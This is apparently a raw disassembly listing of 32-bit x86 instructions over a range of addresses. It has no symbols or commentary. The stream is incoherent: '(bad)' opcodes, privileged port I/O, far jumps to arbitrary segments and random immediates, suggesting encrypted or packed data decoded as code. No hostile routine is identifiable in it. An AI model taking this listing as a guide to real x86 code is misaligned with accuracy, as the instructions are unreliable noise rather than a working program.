  41fa95:	mov    ch,0xc3
  41fa97:	sbb    BYTE PTR ds:0x8543f18c,dl
  41fa9d:	test   BYTE PTR [ecx],bl
  41fa9f:	xchg   DWORD PTR [edx],ebx
  41faa1:	js     0x41fa5d
  41faa3:	mov    ds:0xb06b0313,eax
  41faa8:	push   es
  41faa9:	xchg   DWORD PTR [ecx],edx
  41faab:	inc    edx
  41faac:	mov    ds:0x4596c639,al
  41fab1:	or     edx,0xfec4af9c
  41fab7:	aaa    
  41fab8:	push   es
  41fab9:	bound  esi,QWORD PTR [eax+ecx*2-0x322ca385]
  41fac0:	jg     0x41fadc
  41fac2:	xchg   ebp,eax
  41fac3:	push   ebx
  41fac4:	adc    eax,0x8cde3c6d
  41fac9:	mov    ecx,0x3bf392af
  41face:	test   BYTE PTR [edx-0xdc7f1b3],ah
  41fad4:	adc    al,0xd2
  41fad6:	popa   
  41fad7:	ins    DWORD PTR es:[edi],dx
  41fad8:	mov    bl,0xa8
  41fada:	in     al,dx
  41fadb:	in     eax,0xd7
  41fadd:	dec    eax
  41fade:	in     eax,dx
  41fadf:	sbb    ch,BYTE PTR [ebp+0x23]
  41fae2:	dec    ebx
  41fae3:	repz push ebx
  41fae5:	jno    0x41fa85
  41fae7:	mov    edx,0x731299e8
  41faec:	cdq    
  41faed:	cmp    al,0xc
  41faef:	xchg   DWORD PTR [edi-0x1d],ebx
  41faf2:	test   bl,ah
  41faf4:	(bad)  
  41faf7:	fucom  st(0)
  41faf9:	mov    esi,0x4aa3a2e7
  41fafe:	mov    edx,0x974cfb8d
  41fb03:	repnz sbb al,0xcb
  41fb06:	dec    edx
  41fb07:	or     esi,esi
  41fb09:	mov    al,cs:0xb9db3c2c
  41fb0f:	pop    edx
  41fb10:	adc    ecx,edi
  41fb12:	ss loop 0x41fb29
  41fb15:	inc    edi
  41fb16:	in     eax,dx
  41fb17:	and    eax,ebp
  41fb19:	jmp    0x966b:0x1b3cf706
  41fb20:	stos   DWORD PTR es:[edi],eax
  41fb21:	mov    ds:0xa61d19bf,al
  41fb26:	cmp    DWORD PTR [ecx-0x70532953],0x4e14ea8d
  41fb30:	jmp    0xe0722f09
  41fb35:	enter  0xd444,0x8f
  41fb39:	mov    ebx,0x5942fe13
  41fb3e:	push   esi
  41fb3f:	mov    ds:0x6644ef90,eax
  41fb44:	loopne 0x41fb47
  41fb46:	cmp    al,0xbd
  41fb48:	dec    ebp
  41fb49:	pusha  
  41fb4a:	dec    ecx
  41fb4b:	dec    edx
  41fb4c:	mov    edx,DWORD PTR [eax]
  41fb4e:	ja     0x41fb27
  41fb50:	or     edx,DWORD PTR [ebp+0x7c6235ea]
  41fb56:	dec    edi
  41fb57:	adc    dh,bh
  41fb59:	pop    es
  41fb5a:	inc    esi
  41fb5b:	dec    eax
  41fb5c:	bound  ebp,QWORD PTR [eax]
  41fb5e:	ins    DWORD PTR es:[edi],dx
  41fb5f:	mov    ds:0xd17fd23d,eax
  41fb64:	adc    BYTE PTR [edi-0x43],0x27
  41fb68:	xchg   ebp,eax
  41fb69:	pusha  
  41fb6a:	arpl   WORD PTR [edi-0x2747a5ec],dx
  41fb70:	xchg   edi,eax
  41fb71:	sti    
  41fb72:	shr    DWORD PTR [eax],1
  41fb74:	push   ecx
  41fb75:	inc    ebp
  41fb76:	push   es
  41fb77:	dec    DWORD PTR [eax+0x4b4f3d]
  41fb7d:	add    DWORD PTR gs:[edx-0x743f177a],ebp
  41fb84:	aam    0x7a
  41fb86:	xor    eax,0x428456a
  41fb8b:	or     eax,DWORD PTR [eax-0x56]
  41fb8e:	loope  0x41fb12
  41fb90:	pop    edx
	...
  41fbf1:	add    BYTE PTR [eax],al
  41fbf3:	add    ah,bl
  41fbf5:	sub    BYTE PTR [edx-0x119011c],cl
  41fbfb:	cmp    BYTE PTR [esi],ah
  41fbfd:	ret    
  41fbfe:	or     DWORD PTR [esi],edx
  41fc00:	dec    eax
  41fc01:	in     eax,0xc4
  41fc03:	das    
  41fc04:	push   edx
  41fc05:	push   edx
  41fc06:	add    DWORD PTR [eax],eax
  41fc08:	add    eax,0xb1000001
  41fc0d:	adc    eax,0x4e870052
  41fc12:	ins    DWORD PTR es:[edi],dx
  41fc13:	daa    
  41fc14:	mov    ah,0x2c
  41fc16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fc17:	inc    edi
  41fc18:	loop   0x41fc49
  41fc1a:	add    ah,BYTE PTR [edi-0x14c390eb]
  41fc20:	pop    ss
  41fc21:	add    al,0xb4
  41fc23:	xchg   edi,eax
  41fc24:	fdiv   QWORD PTR [ebx]
  41fc26:	or     BYTE PTR es:[eax+edx*2+0x6c],al
  41fc2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fc2c:	xor    BYTE PTR [edi-0x18],al
  41fc2f:	add    BYTE PTR [ebx-0x6178da3a],ah
  41fc35:	adc    al,0x6c
  41fc37:	stc    
  41fc38:	sub    ebp,edx
  41fc3a:	cmp    ecx,DWORD PTR [edx]
  41fc3c:	xchg   ecx,eax
  41fc3d:	ja     0x41fc08
  41fc3f:	mov    al,ds:0x96a74aaa
  41fc44:	pop    esp
  41fc45:	jmp    0x41fcb2
  41fc47:	fldcw  WORD PTR [ecx+0xc]
  41fc4a:	mov    ah,0xe0
  41fc4c:	fdiv   st,st(3)
  41fc4e:	ss in  al,dx
  41fc50:	mov    cl,0xe5
  41fc52:	in     al,dx
  41fc53:	(bad)  
  41fc54:	pop    ecx
  41fc55:	test   BYTE PTR [esi-0x2d9e5694],bh
  41fc5b:	mov    cl,0xfb
  41fc5d:	jecxz  0x41fc71
  41fc5f:	pop    ecx
  41fc60:	(bad)  
  41fc61:	sbb    BYTE PTR [esi+0x4f913085],al
  41fc67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fc68:	and    ebx,edx
  41fc6a:	mov    ah,0x2b
  41fc6c:	ins    BYTE PTR es:[edi],dx
  41fc6d:	or     esp,esi
  41fc6f:	in     eax,0x95
  41fc71:	push   ds
  41fc72:	mov    DWORD PTR [edx-0x26c949ed],esp
  41fc78:	xchg   ecx,eax
  41fc79:	xchg   ebx,eax
  41fc7a:	push   edi
  41fc7b:	jle    0x41fcbc
  41fc7d:	ins    BYTE PTR es:[edi],dx
  41fc7e:	in     eax,dx
  41fc7f:	mov    ?,ebx
  41fc81:	add    edi,eax
  41fc83:	int    0xc9
  41fc85:	mov    esi,0x5a9c6172
  41fc8a:	sbb    DWORD PTR ds:0x519d19e8,eax
  41fc90:	xchg   edx,eax
  41fc91:	sub    ch,BYTE PTR [esi-0x42]
  41fc94:	mov    esi,0x176611a4
  41fc99:	fwait
  41fc9a:	push   0x73
  41fc9c:	adc    dh,dl
  41fc9e:	popf   
  41fc9f:	das    
  41fca0:	jbe    0x41fc6e
  41fca2:	cld    
  41fca3:	fild   DWORD PTR [edi]
  41fca5:	mov    eax,DWORD PTR [esi-0x25]
  41fca8:	and    al,0xbd
  41fcaa:	sbb    al,0x44
  41fcac:	mov    esp,0x52a6d7a5
  41fcb1:	das    
  41fcb2:	inc    eax
  41fcb3:	ins    BYTE PTR es:[edi],dx
  41fcb4:	push   ds
  41fcb5:	push   esi
  41fcb6:	fcmovnu st,st(2)
  41fcb8:	mov    ah,0xa8
  41fcba:	sbb    al,ah
  41fcbc:	in     eax,0x8c
  41fcbe:	push   edi
  41fcbf:	cmc    
  41fcc0:	dec    ebx
  41fcc1:	(bad)  
  41fcc2:	xor    ebx,DWORD PTR [edx]
  41fcc4:	push   edi
  41fcc5:	(bad)  
  41fcc6:	scas   al,BYTE PTR es:[edi]
  41fcc7:	pusha  
  41fcc8:	mov    ds:0x84b9a1a3,al
  41fccd:	out    0xdf,eax
  41fccf:	sbb    BYTE PTR [eax],dh
  41fcd1:	enter  0x7c8,0x58
  41fcd5:	or     esi,DWORD PTR [ebp-0x5850efc5]
  41fcdb:	fst    DWORD PTR [ecx]
  41fcdd:	and    eax,0xf9ae2c75
  41fce2:	das    
  41fce3:	and    eax,0x9c79e9c8
  41fce8:	ds stc 
  41fcea:	daa    
  41fceb:	xor    eax,0xa6727e57
  41fcf0:	je     0x41fd41
  41fcf2:	outs   dx,DWORD PTR ds:[esi]
  41fcf3:	jb     0x41fd1f
  41fcf5:	lods   al,BYTE PTR ds:[esi]
  41fcf6:	fcom   st(7)
  41fcf8:	jo     0x41fcdb
  41fcfa:	or     cl,BYTE PTR [eax]
  41fcfc:	mov    al,0xb1
  41fcfe:	mov    esi,0x574bd3fd
  41fd03:	xor    edi,DWORD PTR [ebp-0x6a]
  41fd06:	mov    al,ds:0xf12e4951
  41fd0b:	or     DWORD PTR [ebx-0x54],ebx
  41fd0e:	repnz fs mov esp,0x0
	...
  41fd71:	add    BYTE PTR [eax],al
  41fd73:	add    BYTE PTR [edx+ebp*2],cl
  41fd76:	push   edx
  41fd77:	shl    DWORD PTR [esi-0x7],0x9f
  41fd7b:	out    dx,eax
  41fd7c:	pop    ds
  41fd7d:	pop    edx
  41fd7e:	pushf  
  41fd7f:	push   ss
  41fd80:	iret   
  41fd81:	dec    ebx
  41fd82:	mov    eax,0x1535734
  41fd87:	add    BYTE PTR ds:0x47000001,al
  41fd8d:	push   eax
  41fd8e:	mov    ebp,0xb576fd76
  41fd93:	add    DWORD PTR [eax+0x4d453117],ebx
  41fd99:	mov    esi,0x40acce0e
  41fd9e:	dec    DWORD PTR ds:0x78b01d2e
  41fda4:	mov    eax,0x2d5d910
  41fda9:	xor    al,0xad
  41fdab:	mov    edi,DWORD PTR [eax-0x71]
  41fdae:	pusha  
  41fdaf:	cdq    
  41fdb0:	(bad)  
  41fdb1:	in     al,0xf1
  41fdb3:	aad    0x74
  41fdb5:	pop    esi
  41fdb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fdb7:	jbe    0x41fddb
  41fdb9:	pop    edi
  41fdba:	push   ebp
  41fdbb:	push   eax
  41fdbc:	adc    edi,ebx
  41fdbe:	sti    
  41fdbf:	or     DWORD PTR [esi],esi
  41fdc1:	pop    esp
  41fdc2:	stc    
  41fdc3:	push   edx
  41fdc4:	out    dx,al
  41fdc5:	aam    0xf5
  41fdc7:	mov    edx,DWORD PTR [edx]
  41fdc9:	sti    
  41fdca:	(bad)  
  41fdcb:	push   ecx
  41fdcc:	(bad)  
  41fdcd:	or     eax,0x78d95dfe
  41fdd2:	push   esp
  41fdd3:	mov    dh,0x3
  41fdd5:	mov    ebp,ebp
  41fdd7:	push   0xffffffa5
  41fdd9:	jg     0x41fde4
  41fddb:	dec    ebp
  41fddc:	adc    esp,DWORD PTR [ecx]
  41fdde:	das    
  41fddf:	aaa    
  41fde0:	nop
  41fde1:	sahf   
  41fde2:	adc    DWORD PTR [ebp-0x6f],esi
  41fde5:	xor    BYTE PTR [ebx],dh
  41fde7:	ja     0x41fe1c
  41fde9:	add    BYTE PTR [eax],0x11
  41fdec:	cmp    esp,DWORD PTR [ebx+0x56]
  41fdef:	sub    cl,BYTE PTR [ebx-0x45e1bb1b]
  41fdf5:	cmp    eax,ecx
  41fdf7:	and    dh,BYTE PTR [edi+0x7e19c7bb]
  41fdfd:	xchg   ebx,eax
  41fdfe:	jne    0x41fd9b
  41fe00:	stc    
  41fe01:	sbb    bh,BYTE PTR [esi+0x7e005e30]
  41fe07:	(bad)  
  41fe08:	fsubr  QWORD PTR [ecx+ebx*8-0x3e9b47fb]
  41fe0f:	jno    0x41fdf4
  41fe11:	clc    
  41fe12:	ret    0xf013
  41fe15:	in     eax,dx
  41fe16:	(bad)  
  41fe18:	inc    esi
  41fe19:	push   edx
  41fe1a:	push   0x892d4
  41fe1f:	sbb    al,0x48
  41fe21:	call   0x1b4f:0xbf51dcaf
  41fe28:	xor    eax,0xd976db14
  41fe2d:	and    ecx,0x5d
  41fe30:	std    
  41fe31:	lods   al,BYTE PTR ds:[esi]
  41fe32:	pop    edi
  41fe33:	rcr    BYTE PTR ds:0xdde339ed,1
  41fe39:	mov    WORD PTR [ebp+edi*2+0x2f],cs
  41fe3d:	xor    BYTE PTR [ebp+0x7f6202e5],dh
  41fe43:	inc    esi
  41fe44:	sbb    eax,0xd1bcc894
  41fe49:	out    dx,al
  41fe4a:	add    eax,0x33f2d878
  41fe4f:	or     DWORD PTR [ecx-0xc],ebp
  41fe52:	call   0x1ef79965
  41fe57:	add    al,0x3b
  41fe59:	stos   BYTE PTR es:[edi],al
  41fe5a:	fwait
  41fe5b:	mov    dl,0xe5
  41fe5d:	xor    edx,esi
  41fe5f:	arpl   sp,sp
  41fe61:	jp     0x41fe91
  41fe63:	dec    esi
  41fe64:	aaa    
  41fe65:	add    BYTE PTR [ebx+0x1a],0x7c
  41fe69:	fadd   QWORD PTR [ebp-0x69]
  41fe6c:	in     al,0xc7
  41fe6e:	icebp  
  41fe6f:	jg     0x41fe53
  41fe71:	xchg   esi,eax
  41fe72:	sub    BYTE PTR [ecx+0x3476b35b],al
  41fe78:	sbb    edi,DWORD PTR [edx+0x3e]
  41fe7b:	jp     0x41feb9
  41fe7d:	jle    0x41fe8e
  41fe7f:	jno    0x41fe6d
  41fe81:	xchg   BYTE PTR [eax],ah
  41fe83:	mov    eax,0x2ed85ce8
  41fe88:	fsub   DWORD PTR [edi+0x57]
  41fe8b:	xchg   ebp,eax
  41fe8c:	ss mov ebp,0x3a6966
	...
  41fef2:	add    BYTE PTR [eax],al
  41fef4:	stos   BYTE PTR es:[edi],al
  41fef5:	push   ebp
  41fef6:	call   0xfb5d:0xffefffe7
  41fefd:	(bad)  
  41fefe:	hlt    
  41feff:	mov    ah,0x3d
  41ff01:	xchg   al,dh
  41ff03:	rcr    BYTE PTR [esp+edx*2+0x1],1
  41ff07:	add    BYTE PTR ds:0x98000001,al
  41ff0d:	jge    0x41fea1
  41ff0f:	jae    0x41ff09
  41ff11:	lds    esi,FWORD PTR [ecx+0x42]
  41ff14:	or     eax,0x7deb722a
  41ff19:	leave  
  41ff1a:	out    0xdd,al
  41ff1c:	fld    DWORD PTR [ebx+ecx*8+0x2b46aa5f]
  41ff23:	nop
  41ff24:	cld    
  41ff25:	cmp    BYTE PTR [edi-0x369ecaa8],ah
  41ff2b:	jb     0x41ff22
  41ff2d:	stc    
  41ff2e:	pop    ds
  41ff2f:	xchg   esp,eax
  41ff30:	inc    esp
  41ff31:	test   dh,cl
  41ff33:	mov    dl,BYTE PTR ds:0xc5a0813
  41ff39:	sbb    ecx,0x2203ea5b
  41ff3f:	inc    ecx
  41ff40:	fisub  WORD PTR [edi+0x29]
  41ff43:	call   0xb15043e6
  41ff48:	imul   edi,DWORD PTR [eax+eax*4-0x45],0x81ec2336
  41ff50:	js     0x41fedf
  41ff52:	cdq    
  41ff53:	jns    0x41ff45
  41ff55:	xor    eax,0x5317d046
  41ff5a:	inc    edx
  41ff5b:	fs xor bh,bh
  41ff5e:	sub    BYTE PTR [edi],0x3d
  41ff61:	ss push cs
  41ff63:	inc    eax
  41ff64:	push   edx
  41ff65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff66:	das    
  41ff67:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff68:	adc    al,0xb4
  41ff6a:	ds add bl,ch
  41ff6d:	mov    edx,0x1ea923bc
  41ff72:	mov    ah,BYTE PTR [esi]
  41ff74:	jge    0x41ff1a
  41ff76:	bound  ebp,QWORD PTR [edx+esi*1]
  41ff79:	push   ss
  41ff7a:	add    DWORD PTR [edi+eax*2],esi
  41ff7d:	test   al,0x8
  41ff7f:	retf   0x28d2
  41ff82:	(bad)  
  41ff84:	jmp    0xb152:0x45c7e0c5
  41ff8b:	fs call 0xf4a8:0x89134337
  41ff93:	in     eax,dx
  41ff94:	(bad)  
  41ff96:	out    0xb2,eax
  41ff98:	sbb    eax,0x96e9e8f6
  41ff9d:	(bad)  
  41ff9e:	arpl   WORD PTR [ebp+0x34815d08],cx
  41ffa4:	cdq    
  41ffa5:	div    DWORD PTR [ebp+0x5c]
  41ffa8:	into   
  41ffa9:	or     al,0x80
  41ffab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffac:	xor    DWORD PTR [ebx+0x2f9227fb],ebp
  41ffb2:	std    
  41ffb3:	or     eax,0x1939dbd4
  41ffb8:	aad    0x6b
  41ffba:	enter  0x368a,0xa7
  41ffbe:	add    DWORD PTR [esp+eax*2+0x7048c9c5],ebx
  41ffc5:	aas    
  41ffc6:	cmc    
  41ffc7:	aam    0xd4
  41ffc9:	clc    
  41ffca:	rcl    BYTE PTR [eax+0x7d],1
  41ffcd:	or     BYTE PTR [edx+0x4f],bl
  41ffd0:	es xor eax,0x7a0220c8
  41ffd6:	pop    ds
  41ffd7:	or     BYTE PTR [ebx-0x123ad6e],dh
  41ffdd:	outs   dx,BYTE PTR ds:[esi]
  41ffde:	aad    0x53
  41ffe0:	mov    cl,0x42
  41ffe2:	retf   0x2308
  41ffe5:	call   0x7369a226
  41ffea:	xor    cl,BYTE PTR [ecx+0x7711bf4f]
  41fff0:	mov    ecx,0x6cb235ea
  41fff5:	jl     0x41ff7d
  41fff7:	mov    ebp,0xbf4d904c
  41fffc:	xchg   edi,eax
  41fffd:	pop    edi
  41fffe:	push   es
  41ffff:	jmp    0x420051
  420001:	or     ebp,DWORD PTR [eax+0x1c33f595]
  420007:	(bad)  
  420009:	pushf  
  42000a:	aas    
  42000b:	sub    ch,BYTE PTR ss:[edx+0x3cca0b]
	...
  420072:	add    BYTE PTR [eax],al
  420074:	bound  esp,QWORD PTR [ebp-0x8808a]
  42007a:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0xffffff8a
  420081:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420082:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420083:	jg     0x4200e6
  420085:	push   ebp
  420086:	add    DWORD PTR [eax],eax
  420088:	add    eax,0xb7000001
  42008d:	std    
  42008e:	(bad)  
  42008f:	pop    DWORD PTR [edi+eax*4+0x7b8b02d4]
  420096:	call   0xb84c:0xeedcc0b5
  42009d:	div    DWORD PTR [esi+0x203aca35]
  4200a3:	cmp    al,0xe8
  4200a5:	into   
  4200a6:	fistp  WORD PTR [edi+0x7c5693b0]
  4200ac:	sbb    eax,0xf5567272
  4200b1:	clc    
  4200b2:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4200b4:	call   0xebca:0xcc4bd23f
  4200bb:	in     eax,0x2d
  4200bd:	dec    esi
  4200be:	or     DWORD PTR [eax+0x7f7c4d9e],esi
  4200c4:	and    eax,DWORD PTR [ebp+0x728d8616]
  4200ca:	xchg   DWORD PTR [ecx],esp
  4200cc:	dec    ecx
  4200cd:	adc    al,0x9f
  4200cf:	repnz in al,dx
  4200d1:	inc    edi
  4200d2:	xchg   edx,eax
  4200d3:	les    esp,FWORD PTR [ecx+ebx*4-0x75]
  4200d7:	jnp    0x420150
  4200d9:	hlt    
  4200da:	(bad)  
  4200db:	or     DWORD PTR [ecx-0x3],ebx
  4200de:	cmp    edi,DWORD PTR [ebp-0x62]
  4200e1:	mov    bh,0x1a
  4200e3:	or     DWORD PTR [edx+ecx*2],edi
  4200e6:	cmp    bl,BYTE PTR [eax+0x207764eb]
  4200ec:	push   ds
  4200ed:	gs ret 
  4200ef:	jmp    0x6a45:0x20ae97d5
  4200f6:	pop    edx
  4200f7:	sar    BYTE PTR ds:0xf16b2fc4,1
  4200fd:	mov    edx,0xdebf934b
  420102:	(bad)  
  420103:	jmp    0xdf014272
  420108:	mov    ds:0x24125038,eax
  42010d:	sub    al,0xe8
  42010f:	pop    ecx
  420110:	sbb    al,0x1a
  420112:	lahf   
  420113:	pop    eax
  420114:	push   ss
  420115:	mov    dh,0x83
  420117:	mov    ebx,0x8f2e710a
  42011c:	cwde   
  42011d:	jbe    0x420142
  42011f:	enter  0xa04c,0xdf
  420123:	test   DWORD PTR [esi],edi
  420125:	sti    
  420126:	xchg   esp,eax
  420127:	mov    ds:0xec97d389,eax
  42012c:	inc    eax
  42012d:	retf   0x4c3b
  420130:	xchg   ebp,eax
  420131:	pop    esp
  420132:	test   al,0x84
  420134:	ja     0x420123
  420136:	inc    eax
  420137:	sub    al,0x9f
  420139:	inc    esi
  42013a:	icebp  
  42013b:	psubusw mm4,QWORD PTR [edi+0x45]
  42013f:	ds int3 
  420141:	fld    DWORD PTR [bp+di-0x6faf]
  420146:	pop    esi
  420147:	pop    DWORD PTR [esi]
  420149:	dec    ebx
  42014a:	loop   0x42010b
  42014c:	xor    al,0x9b
  42014e:	cmc    
  42014f:	popf   
  420150:	call   DWORD PTR [edi+0x4541b3a3]
  420156:	gs (bad) 
  420158:	sar    BYTE PTR gs:[esi-0x515c534],cl
  42015f:	cmp    BYTE PTR [edi+0x41],dl
  420162:	sub    eax,0x320f4fea
  420167:	dec    eax
  420168:	stc    
  420169:	mov    ds:0xa3f364d,al
  42016e:	ret    0xa90d
  420171:	push   esi
  420172:	mov    esp,0xabbb82f4
  420177:	pop    ebx
  420178:	data16 jle 0x42016b
  42017b:	mov    BYTE PTR [ecx+0x60],bh
  42017e:	dec    ecx
  42017f:	test   al,0x42
  420181:	jmp    0xd1b9:0x7614cf63
  420188:	daa    
  420189:	imul   edi,DWORD PTR [ebx],0xf0b73cfc
  42018f:	outs   dx,DWORD PTR ds:[esi]
  420190:	dec    esp
	...
  4201f1:	add    BYTE PTR [eax],al
  4201f3:	add    BYTE PTR [ebx-0x31],dh
  4201f6:	fwait
  4201f7:	cmp    DWORD PTR [edi-0x27300c83],edi
  4201fd:	stos   BYTE PTR es:[edi],al
  4201fe:	sar    BYTE PTR [ebx+0x38a9cef8],1
  420204:	push   si
  420206:	add    DWORD PTR [eax],eax
  420208:	add    eax,0x60000001
  42020d:	stc    
  42020e:	scas   al,BYTE PTR es:[edi]
  42020f:	add    DWORD PTR [ecx+0x639f9d8d],edx
  420215:	out    dx,al
  420216:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420217:	or     esi,edi
  420219:	rol    DWORD PTR [ebp+0x19b01ba6],1
  42021f:	hlt    
  420220:	adc    ebp,esp
  420222:	(bad)  
  420223:	pop    ebp
  420224:	dec    eax
  420225:	mov    BYTE PTR [edi+0x3d],bl
  420228:	enter  0x68d9,0x80
  42022c:	lock imul ebx
  42022f:	std    
  420230:	sbb    al,0xd9
  420232:	and    DWORD PTR [esi-0x18],eax
  420235:	int3   
  420236:	fcom   DWORD PTR [eax+0x79]
  420239:	std    
  42023a:	ja     0x420269
  42023c:	je     0x42021b
  42023e:	jae    0x4202ab
  420240:	push   es
  420241:	aad    0xf2
  420243:	jg     0x420210
  420245:	loopne 0x42022a
  420247:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420248:	shl    BYTE PTR [edx+0x49],cl
  42024b:	call   0x182dc9d1
  420250:	arpl   WORD PTR [ecx-0x44],cx
  420253:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420254:	in     eax,dx
  420255:	or     BYTE PTR [ecx-0x66b44e83],bl
  42025b:	shl    DWORD PTR [esi+0x5e],cl
  42025e:	in     eax,dx
  42025f:	mov    bh,0x24
  420261:	xlat   BYTE PTR ds:[ebx]
  420262:	and    esp,edx
  420264:	retf   
  420265:	fdivr  st(5),st
  420267:	popa   
  420268:	jo     0x420249
  42026a:	loope  0x4202ac
  42026c:	mov    es,WORD PTR [ebx+0x57]
  42026f:	push   eax
  420270:	sbb    al,0xf9
  420272:	nop
  420273:	pop    eax
  420274:	or     eax,0x69688798
  420279:	aad    0x4d
  42027b:	scas   al,BYTE PTR es:[edi]
  42027c:	or     bl,BYTE PTR ds:0x6997ca0b
  420282:	or     ch,BYTE PTR [esi-0x17044f9]
  420288:	mov    eax,ds:0x35bb4244
  42028d:	jnp    0x4202a7
  42028f:	xlat   BYTE PTR ds:[ebx]
  420290:	xchg   edx,eax
  420291:	jle    0x420286
  420293:	push   0xb7cae9
  420298:	xor    BYTE PTR [esi+ebx*1+0x2f],al
  42029c:	dec    edi
  42029d:	jns    0x420306
  42029f:	sbb    cl,BYTE PTR [edi]
  4202a1:	test   eax,0xf2b457ba
  4202a6:	add    bh,dh
  4202a8:	xor    al,0x21
  4202aa:	jae    0x4202af
  4202ac:	and    BYTE PTR [ebx],0x6d
  4202af:	nop
  4202b0:	xchg   ecx,eax
  4202b1:	dec    ecx
  4202b2:	outs   dx,BYTE PTR ds:[esi]
  4202b3:	lods   al,BYTE PTR ds:[esi]
  4202b4:	pop    esp
  4202b5:	lods   eax,DWORD PTR gs:[esi]
  4202b7:	addr16 out 0x65,al
  4202ba:	pmullw mm2,QWORD PTR [ecx+0x65ddbe5d]
  4202c1:	retf   0x83e0
  4202c4:	inc    ebp
  4202c5:	hlt    
  4202c6:	push   esp
  4202c7:	ins    BYTE PTR es:[edi],dx
  4202c8:	les    ecx,FWORD PTR [ebx+0xa]
  4202cb:	mov    ebx,0xa493117a
  4202d0:	sub    al,0xb9
  4202d2:	adc    al,0xbc
  4202d4:	sub    eax,0x74cac673
  4202d9:	cmp    eax,0x855f3a55
  4202de:	dec    esp
  4202df:	xlat   BYTE PTR ds:[ebx]
  4202e0:	out    dx,eax
  4202e1:	lea    edx,[ecx]
  4202e3:	mov    ebx,0x26912dcc
  4202e8:	mov    eax,ds:0xe8c32e4
  4202ed:	xor    DWORD PTR [eax+eax*2],edx
  4202f0:	(bad)  
  4202f1:	enter  0x528f,0x6f
  4202f5:	cmp    al,0xe5
  4202f7:	lahf   
  4202f8:	pop    ds
  4202f9:	cmp    bl,ch
  4202fb:	std    
  4202fc:	outs   dx,DWORD PTR ds:[esi]
  4202fd:	call   0xd38e:0x4e3b38e7
  420304:	test   BYTE PTR [eax+0x38],al
  420307:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420308:	mov    BYTE PTR [eax+0x3b],dh
  42030b:	add    esp,edx
  42030d:	push   cs
  42030e:	mov    BYTE PTR [edi+0x96],cl
	...
  420374:	inc    ecx
  420375:	push   es
  420376:	clc    
  420377:	mov    esi,0xff47feff
  42037c:	and    BYTE PTR [eax+0x2a],bh
  42037f:	hlt    
  420380:	push   edx
  420381:	mov    ebx,0x576bd4e3
  420386:	add    DWORD PTR [eax],eax
  420388:	add    eax,0xee000001
  42038d:	mov    ss,WORD PTR [ebp+0x13e409f0]
  420393:	mov    DWORD PTR [ebp+0x3e],eax
  420396:	push   esp
  420397:	sbb    al,0xdf
  420399:	sub    dl,BYTE PTR [edi]
  42039b:	into   
  42039c:	loopne 0x4203d3
  42039e:	xchg   esp,eax
  42039f:	push   cs
  4203a0:	jb     0x420395
  4203a2:	lock mov ds:0xb704bf08,eax
  4203a8:	daa    
  4203a9:	enter  0xefa3,0x42
  4203ad:	pop    esp
  4203ae:	mov    bl,0xac
  4203b0:	lea    esp,[eax+0x75b83d71]
  4203b6:	push   0xfc4ac595
  4203bb:	cmp    BYTE PTR [edi-0x7ac0ee4c],ch
  4203c1:	in     al,dx
  4203c2:	push   ss
  4203c3:	push   esi
  4203c4:	adc    BYTE PTR [eax+0x5a],bh
  4203c7:	into   
  4203c8:	jmp    0x24448749
  4203cd:	nop
  4203ce:	aaa    
  4203cf:	inc    esp
  4203d0:	mov    edx,0x51d42306
  4203d5:	adc    ah,BYTE PTR [edi]
  4203d7:	pop    esi
  4203d8:	out    0x12,al
  4203da:	and    DWORD PTR [eax],esp
  4203dc:	pushf  
  4203dd:	mov    esi,0x5b89d8c3
  4203e2:	fsubr  st,st(3)
  4203e4:	pop    esi
  4203e5:	fcom   DWORD PTR [edx+edi*2-0x5fdfbd20]
  4203ec:	in     al,0xba
  4203ee:	jne    0x42043e
  4203f0:	jb     0x42042a
  4203f2:	xor    DWORD PTR [ebx-0x38b70dc],esp
  4203f8:	jl     0x4203a7
  4203fa:	(bad)  
  4203fb:	xchg   esp,eax
  4203fc:	stc    
  4203fd:	cdq    
  4203fe:	xor    DWORD PTR [ebx-0x5d9fd4bd],esi
  420404:	dec    esi
  420405:	sbb    al,0x65
  420407:	cs cdq 
  420409:	ror    ebp,0xc3
  42040c:	not    DWORD PTR [ecx+0x14]
  42040f:	xchg   DWORD PTR [ebp-0x4d],edi
  420412:	jno    0x420443
  420414:	iret   
  420415:	nop
  420416:	mov    ?,WORD PTR [eax+0x4318b8b2]
  42041c:	or     ecx,esi
  42041e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42041f:	and    ah,BYTE PTR [ecx]
  420421:	cmp    al,0x71
  420423:	mov    ds:0x3d0d5742,eax
  420428:	into   
  420429:	stc    
  42042a:	xchg   edx,eax
  42042b:	push   cs
  42042c:	cli    
  42042d:	sub    edi,DWORD PTR [edx+0xca741e5]
  420433:	fs rcr edx,cl
  420436:	pop    ds
  420437:	mov    ebp,?
  420439:	add    cl,ah
  42043b:	dec    esi
  42043c:	mov    ebp,0x660a9f8c
  420441:	jle    0x420420
  420443:	test   dl,al
  420445:	jg     0x4203dc
  420447:	pop    ebp
  420448:	mov    bl,0xef
  42044a:	jmp    0xf887c357
  42044f:	dec    edx
  420450:	retf   0xb690
  420453:	rol    DWORD PTR [ebp+0x7b6b53d9],1
  420459:	jecxz  0x4204ca
  42045b:	jb     0x420480
  42045d:	jns    0x4204bd
  42045f:	add    eax,0xbc3829e9
  420464:	sbb    BYTE PTR [ebx-0xe52ab0a],ch
  42046a:	rol    DWORD PTR [ebp-0x36231c81],0x22
  420471:	pop    eax
  420472:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420473:	mov    ecx,0x8ac47550
  420478:	ret    
  420479:	and    bl,bh
  42047b:	retf   
  42047c:	ins    BYTE PTR es:[edi],dx
  42047d:	syscall 
  42047f:	inc    ebx
